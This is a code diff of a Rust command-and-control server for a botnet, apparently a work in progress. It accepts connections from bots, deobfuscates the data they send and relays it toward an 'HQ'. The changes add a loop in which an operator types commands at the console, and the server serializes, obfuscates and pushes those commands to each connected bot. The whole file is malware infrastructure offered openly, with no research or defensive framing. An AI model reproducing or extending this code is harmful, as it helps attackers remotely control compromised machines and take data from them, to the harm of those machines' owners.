@@ -2,7 +2,6 @@ extern crate core;
 use tokio::{
     io::{AsyncReadExt, AsyncWriteExt, BufReader, Interest, ReadBuf},
     macros::support::poll_fn,
-    net::{TcpListener, TcpStream},
     sync::{
         broadcast,
         broadcast::Receiver,
@@ -11,11 +10,14 @@ use tokio::{
     net::tcp::OwnedWriteHalf
 };
 use std::{io, slice, net::SocketAddr, process::Command, ptr::slice_from_raw_parts, str::{EscapeDebug, from_utf8}, thread, net, future};
+use std::error::Error;
 use std::sync::mpsc;
 use serde::{Deserialize, Serialize};
 use rmp_serde::{Deserializer, Serializer};
 use base32;
 use std::future::Future;
+use std::thread::JoinHandle;
+use tokio::sync::broadcast::error::TryRecvError;
 
 use crate::communication::bot::{Bot, Device_stream};
 use crate::communication::rsa_encryption;
@@ -32,7 +34,7 @@ const MSG_SIZE: usize = 4096;
 const USERNAME_LENGTH: usize = 10;
 const IV_LEN: usize = 16;
 
-async fn handle_message_received(DS: &mut bot::Device_stream, socket: &TcpStream) -> Vec<u8> {
+async fn handle_message_received(DS: &mut bot::Device_stream, socket: &tokio::net::TcpStream) -> Vec<u8> {
     let mut buffer = [0; MSG_SIZE];
     loop {
         socket.readable().await;
@@ -48,7 +50,7 @@ async fn handle_message_received(DS: &mut bot::Device_stream, socket: &TcpStream
             Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
                 // edode : Avoid returning an empty vector (empty Incoming_Message)
                 println!("Error: {}", e);
-                continue;
+                //continue;
             }
             Err(e) => {
                 println!("Error: {}", e);
@@ -59,15 +61,7 @@ async fn handle_message_received(DS: &mut bot::Device_stream, socket: &TcpStream
     };
 }
 
-async fn authenticate_new_user(socket: &TcpStream, addr: SocketAddr) -> bot::Device_stream {
-/*    let mut DS = bot::Device_stream {
-        stream: socket,
-        ip_address: addr,
-        authenticated: false,
-        connected: true,
-        encryption_key: vec![],
-        B: bot::Bot::new(Vec::new(), Vec::new()),
-    };*/
+async fn authenticate_new_user(socket: &tokio::net::TcpStream, addr: SocketAddr) -> bot::Device_stream {
     let mut DS = Device_stream::new(
         addr,
         false,
@@ -87,9 +81,10 @@ async fn authenticate_new_user(socket: &TcpStream, addr: SocketAddr) -> bot::Dev
 
 async fn handle_message_from_client(
     mut DS: bot::Device_stream,
-    mut tx: Sender<bot::Device_stream>,
-    mut socket: TcpStream,
-){
+    mut c2_tx: Sender<bot::Device_stream>,
+    mut cmd_rx: Receiver<bot::Device_stream>,
+    mut socket: tokio::net::TcpStream,
+) -> io::Result<()> {
 
     let mut buffer: [u8; 4096] = [0; MSG_SIZE];
     let mut bf: [u8; 4096] = [0; MSG_SIZE];
@@ -103,7 +98,7 @@ async fn handle_message_from_client(
             Ok(recv_bytes) => { // edode : Deobfuscating data and sending it to the HQ
                 let marshaled_data = dp::deobfuscate_data(buffer.to_vec(), true, &DS.encryption_key);
                 DS.B = dp::deserialize_message(marshaled_data);
-                tx.send(DS.clone()).unwrap();
+                c2_tx.send(DS.clone()).unwrap();
                 buffer
                     .iter_mut()
                     .for_each(|x| *x = 0); // reset buffer
@@ -111,37 +106,28 @@ async fn handle_message_from_client(
             Err(ref err) if err.kind() == io::ErrorKind::WouldBlock => {
                 // edode : Avoid returning an empty vector (empty Incoming_Message)
                 //println!("Error: {}", err);
-                continue;
+                //continue; -> removing this allows to listen and to write commands
             },
             Err(err) => {
                 println!("Error: {}", err);
             },
         };
-
-/*        match tx.try_recv() {
-            Ok(mut received_data) => { // ACP-0
-                println!("Received data from channel : {:?}, from : {:?}", received_data, DS.ip_address);
-                //sending the data to other users
-                println!("Sending data to {}", DS.ip_address);
-
-                DS.B = received_data;
-                let y = serialize_data(&DS.B);
-                let x = obfuscate_data(y, &DS.encryption_key);
-                socket.write(&x.to_vec()).await.unwrap();
-                DS.B.erase_data();
+        match cmd_rx.try_recv() {
+            Ok(DS) => {
+                println!("Received command from HQ");
+                let serialized_data = serialize_data(&DS.B);
+                let obfuscated_data = obfuscate_data(serialized_data, &DS.encryption_key);
+                socket.write(obfuscated_data.as_slice()).await?;
             },
-            Err(err) => {
-                // edode : empty channel
-                //println!("Could not receive data : {}", err);
-            },
-        };*/
-
+            _ => {}
+        };
     }
+    Ok(())
 }
 
-fn client_input (
-    tx: Sender<bot::Bot>,
-    mut b: &mut bot::Bot,
+async fn client_input (
+    tx: Sender<Device_stream>,
+    mut DS: &mut bot::Device_stream,
 ) {
     loop {
         println!("-> ");
@@ -150,8 +136,9 @@ fn client_input (
             .read_line(&mut buff)
             .expect("Did not entered a correct string");
         buff.pop();
-        b.com.command = buff.as_bytes().to_vec();
-        tx.send(b.clone()).unwrap(); // edode : Data has to be sent to the bots
+        DS.B.com.command = buff.as_bytes().to_vec();
+
+        tx.send(DS.clone()).unwrap(); // edode : Data has to be sent to the bots
     }
 }
 
@@ -161,7 +148,7 @@ async fn receive_bot_data(
 ) {
     loop {
         match bot_rx.try_recv() {
-            Ok(mut received_data) => { // ACP-0
+            Ok(mut received_data) => {
                 println!("Received data from channel : {:?} from : {:?}", received_data.B, received_data.ip_address);
                 println!("Sending Data to Commanding C2");
                 // lisandro : write the code for sending it to HQ
@@ -176,15 +163,17 @@ async fn receive_bot_data(
 }
 
 #[tokio::main]
-pub async fn main() -> io::Result<()> {
-    let listener = TcpListener::bind(LOCAL).await?;
-    let (channel_snd, mut _chann_rcv)  = broadcast::channel(64);
+pub async fn main() -> Result<(), Box<dyn Error>> {
+    let listener = tokio::net::TcpListener::bind(LOCAL).await?;
+    let (chn_bot_tx, mut _chn_bot_rcv) = broadcast::channel(64);
+    let (chn_c2_tx, mut _chn_c2_rx) = broadcast::channel(64);
 
     //let (bot_input_sender, bot_input_receiver) = broadcast::channel(64);
     println!("C2 Server Initialized");
     loop {
         // User accept
-        let (socket, addr) = listener.accept().await.unwrap();
+        let (socket, addr) = listener.accept().await?;
+
         println!("New user connected: {}", addr);
         let mut DS: bot::Device_stream = authenticate_new_user(&socket, addr).await;
 
@@ -192,25 +181,26 @@ pub async fn main() -> io::Result<()> {
             drop(DS);
             continue;
         }
+        let mut c_cmd = DS.clone();
 
-        // Thread creation
-        let mut thread_rcv = channel_snd.subscribe();
-        let mut tr = channel_snd.subscribe();
-        let thread_send = channel_snd.clone();
+        let mut bot_rcv = chn_bot_tx.subscribe();
+        let bot_tx = chn_bot_tx.clone();
 
-        let mut c_cmd = DS.B.clone();
+        let mut c2_rcv = chn_c2_tx.subscribe();
+        let c2_tx = chn_c2_tx.clone();
+        let tr = chn_c2_tx.clone();
 
         tokio::spawn(async move {
-            handle_message_from_client(DS, thread_send, socket).await;
+            handle_message_from_client(DS, bot_tx, c2_rcv, socket).await;
         });
 
         tokio::spawn(async move {
-            receive_bot_data(thread_rcv).await;
+            receive_bot_data(bot_rcv).await;
         });
 
-        //tokio::spawn(async move {
-        //    client_input(tr, &mut c_cmd).await;
-        //});
+        tokio::spawn(async move {
+            client_input(c2_tx, &mut c_cmd).await;
+        });
     }
     Ok(())
 }
